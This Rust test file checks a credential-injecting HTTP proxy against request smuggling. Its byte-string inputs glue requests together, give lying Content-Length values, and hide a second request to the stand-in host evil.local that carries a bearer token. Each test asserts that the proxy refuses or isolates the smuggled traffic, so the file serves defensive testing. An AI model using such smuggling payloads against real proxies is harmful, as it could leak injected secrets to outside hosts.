// Connection-level smuggling (DESIGN, Tests): glued requests, lying lengths, leftover bytes.
// Each request is checked from scratch, the next one starts exactly after "Content-Length"
// bytes, and nothing after a close is handled.

use crate::common::{
    KEY, LIMITS, Program, SECRETS, arrivals, get, requests, settings_for, start_fake_api,
    start_proxy, summary,
};

#[tokio::test]
async fn glued_requests_each_get_a_line_and_their_own_server_connection() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(&[get("/ok", KEY), get("/no-content", "")].concat())
        .await;
    assert_eq!(
        program.response().await,
        (
            "HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\n".to_string(),
            b"ok".to_vec()
        )
    );
    assert_eq!(
        program.response().await,
        ("HTTP/1.1 204 No Content\r\n\r\n".to_string(), Vec::new())
    );

    let (served, lines) = proxy.stop().await;
    assert_eq!(served, Ok(()));
    assert_eq!(
        summary(&lines),
        [
            "start",
            "release [weather_key] api.weather.local:80",
            "pass api.weather.local:80",
            "stop"
        ]
    );
    let reached: Vec<(u64, String)> = requests(&seen)
        .into_iter()
        .map(|(connection, received)| (connection, received.head.target))
        .collect();
    assert_eq!(
        reached,
        [(1, "/ok".to_string()), (2, "/no-content".to_string())]
    );
}

// An old client's empty line after a POST body is skipped: it belongs to the next request's head
// (RFC 9112 §2.2, DESIGN, Parser), which starts after exactly "Content-Length" bytes
#[tokio::test]
async fn an_empty_line_between_glued_requests_is_skipped() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    let post = b"POST http://api.weather.local/ok HTTP/1.1\r\nHost: api.weather.local\r\nContent-Length: 2\r\n\r\nhi";
    program
        .send(&[post.as_slice(), b"\r\n", &get("/no-content", "")].concat())
        .await;
    assert_eq!(program.response().await.1, b"ok");
    assert_eq!(
        program.response().await,
        ("HTTP/1.1 204 No Content\r\n\r\n".to_string(), Vec::new())
    );

    let (served, lines) = proxy.stop().await;
    assert_eq!(served, Ok(()));
    assert_eq!(
        summary(&lines),
        [
            "start",
            "pass api.weather.local:80",
            "pass api.weather.local:80",
            "stop"
        ]
    );
    let reached: Vec<(u64, String, Vec<u8>)> = requests(&seen)
        .into_iter()
        .map(|(connection, received)| (connection, received.head.target, received.body))
        .collect();
    assert_eq!(
        reached,
        [
            (1, "/ok".to_string(), b"hi".to_vec()),
            (2, "/no-content".to_string(), Vec::new())
        ]
    );
}

#[tokio::test]
async fn a_request_glued_to_a_refused_one_is_never_handled() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    let refused = b"GET http://evil.local/ HTTP/1.1\r\nHost: evil.local\r\n\r\n";
    program
        .send(&[refused.as_slice(), &get("/ok", "")].concat())
        .await;
    assert_eq!(
        program.rest().await,
        b"HTTP/1.1 403 Forbidden\r\ncontent-length: 16\r\ncontent-type: text/plain\r\nconnection: close\r\n\r\nhost_not_allowed"
    );

    let (_, lines) = proxy.stop().await;
    assert_eq!(
        summary(&lines),
        ["start", "refuse [] evil.local:80 host_not_allowed", "stop"]
    );
    assert!(arrivals(&seen).is_empty(), "nothing reaches the fake API");
}

#[tokio::test]
async fn a_request_glued_to_one_with_connection_close_is_never_handled() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(&[get("/ok", "Connection: close\r\n"), get("/no-content", "")].concat())
        .await;
    assert_eq!(
        program.rest().await,
        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok"
    );

    let (_, lines) = proxy.stop().await;
    assert_eq!(
        summary(&lines),
        ["start", "pass api.weather.local:80", "stop"]
    );
    assert_eq!(requests(&seen).len(), 1);
}

// Also protocol 4's row "Program closes part-way through the body"
#[tokio::test]
async fn a_content_length_longer_than_the_body_sends_nothing() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(b"POST http://api.weather.local/ok HTTP/1.1\r\nHost: api.weather.local\r\nAuthorization: Bearer TALLY_0123456789abcdef0123456789abcdef\r\nContent-Length: 10\r\n\r\nabcd")
        .await;
    program.close_writing().await;
    assert_eq!(
        program.rest().await,
        b"",
        "no reply: the program has closed"
    );

    let lines = proxy.lines(2).await;
    assert_eq!(
        summary(&lines),
        [
            "start",
            "refuse [weather_key] api.weather.local:80 incomplete_request"
        ]
    );
    assert_eq!(proxy.stop().await.0, Ok(()));
    assert!(arrivals(&seen).is_empty(), "nothing reaches the fake API");
}

#[tokio::test]
async fn bytes_past_a_content_length_are_the_next_request() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(b"POST http://api.weather.local/ok HTTP/1.1\r\nHost: api.weather.local\r\nContent-Length: 2\r\n\r\nokGET http://api.weather.local/no-content HTTP/1.1\r\nHost: api.weather.local\r\n\r\n")
        .await;
    assert_eq!(program.response().await.1, b"ok");
    assert_eq!(
        program.response().await,
        ("HTTP/1.1 204 No Content\r\n\r\n".to_string(), Vec::new())
    );

    let (_, lines) = proxy.stop().await;
    assert_eq!(
        summary(&lines),
        [
            "start",
            "pass api.weather.local:80",
            "pass api.weather.local:80",
            "stop"
        ]
    );
    let reached = requests(&seen);
    assert_eq!(reached.len(), 2);
    assert_eq!(reached[0].1.body, b"ok", "exactly Content-Length bytes");
    assert_eq!(reached[1].1.head.target, "/no-content");
}

#[tokio::test]
async fn a_request_hidden_in_a_body_without_content_length_is_checked_on_its_own() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(b"GET http://api.weather.local/ok HTTP/1.1\r\nHost: api.weather.local\r\n\r\nGET http://evil.local/ HTTP/1.1\r\nHost: evil.local\r\nAuthorization: Bearer TALLY_0123456789abcdef0123456789abcdef\r\n\r\n")
        .await;
    assert_eq!(program.response().await.1, b"ok");
    assert!(
        program
            .head()
            .await
            .starts_with("HTTP/1.1 403 Forbidden\r\n"),
        "the hidden request is refused"
    );

    let (_, lines) = proxy.stop().await;
    assert_eq!(
        summary(&lines),
        [
            "start",
            "pass api.weather.local:80",
            "refuse [weather_key] evil.local:80 host_not_allowed",
            "stop"
        ]
    );
    let reached = requests(&seen);
    assert_eq!(reached.len(), 1);
    assert!(reached[0].1.body.is_empty());
}

#[tokio::test]
async fn leftover_bytes_that_arent_a_request_are_refused() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(&[get("/ok", ""), b"not a request\r\n\r\n".to_vec()].concat())
        .await;
    assert_eq!(program.response().await.1, b"ok");
    assert_eq!(
        program.rest().await,
        b"HTTP/1.1 400 Bad Request\r\ncontent-length: 17\r\ncontent-type: text/plain\r\nconnection: close\r\n\r\nmalformed_request"
    );

    let (_, lines) = proxy.stop().await;
    assert_eq!(
        summary(&lines),
        [
            "start",
            "pass api.weather.local:80",
            "refuse [] null malformed_request",
            "stop"
        ]
    );
    assert_eq!(requests(&seen).len(), 1);
}

#[tokio::test]
async fn the_start_of_a_second_request_then_a_close_is_incomplete() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(
            &[
                get("/ok", ""),
                b"GET http://api.weather.local/ok HTTP/1.1\r\nHo".to_vec(),
            ]
            .concat(),
        )
        .await;
    program.close_writing().await;
    assert_eq!(program.response().await.1, b"ok");
    assert_eq!(
        program.rest().await,
        b"",
        "no reply: the program has closed"
    );

    let lines = proxy.lines(3).await;
    assert_eq!(
        summary(&lines),
        [
            "start",
            "pass api.weather.local:80",
            "refuse [] null incomplete_request"
        ]
    );
    assert_eq!(proxy.stop().await.0, Ok(()));
    assert_eq!(requests(&seen).len(), 1);
}

#[tokio::test]
async fn bytes_past_a_responses_content_length_never_reach_the_program() {
    let (server, _seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program.send(&get("/extra-after-body", "")).await;
    assert_eq!(
        program.response().await,
        (
            "HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\n".to_string(),
            b"ok".to_vec()
        )
    );
    // The next request gets its own response, not the one the Server sent after the body
    program.send(&get("/no-content", "")).await;
    assert_eq!(
        program.response().await,
        ("HTTP/1.1 204 No Content\r\n\r\n".to_string(), Vec::new())
    );

    let (_, lines) = proxy.stop().await;
    assert_eq!(
        summary(&lines),
        [
            "start",
            "pass api.weather.local:80",
            "pass api.weather.local:80",
            "stop"
        ]
    );
}

#[tokio::test]
async fn the_server_gets_the_request_rewritten_with_connection_close() {
    let (server, seen) = start_fake_api().await;
    let proxy = start_proxy(&settings_for(server), SECRETS, LIMITS).await;
    let mut program = Program::connect(proxy.address).await;

    program
        .send(&get(
            "/ok?a=1",
            "Connection: keep-alive\r\nKeep-Alive: timeout=5\r\nTE: trailers\r\nProxy-Authorization: Basic abc\r\nX-Other: 1\r\n",
        ))
        .await;
    assert_eq!(program.response().await.1, b"ok");

    assert_eq!(proxy.stop().await.0, Ok(()));
    let reached = requests(&seen);
    assert_eq!(reached.len(), 1);
    assert_eq!(
        String::from_utf8_lossy(&reached[0].1.raw),
        "GET /ok?a=1 HTTP/1.1\r\nhost: api.weather.local\r\nx-other: 1\r\nconnection: close\r\n\r\n"
    );
}
